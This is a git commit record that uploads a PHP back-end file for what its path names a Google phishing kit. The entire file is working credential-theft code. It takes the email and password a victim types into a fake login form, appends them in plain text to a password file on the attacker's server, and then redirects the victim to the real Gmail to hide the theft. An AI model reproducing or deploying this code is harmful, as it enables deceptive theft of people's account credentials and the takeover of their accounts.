d8fafe0a23781d7e391848960629d5a86ae8993f
Joel-Horensma <58894372+Joel-Horensma@users.noreply.github.com>
2019-12-15 14:01:53 -0500

    Add files via upload

---
+++ Social/Google_Phisher/totxt.php
@@ -0,0 +1,13 @@
+<?php
+$email = $_POST["email"];
+$password = $_POST["password"];
+$text = "//////////
+USERNAME: $email 
+PASSWORD: $password
+//////////"; 
+$file = "/var/www/html/ULTIMATE/php/txt/pass.txt";
+$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
+fwrite($fp, $text) or die("Couldn't write values to file!"); 
+fclose($fp);
+?>
+<meta http-equiv="refresh" content="0; url=https://mail.google.com" />`
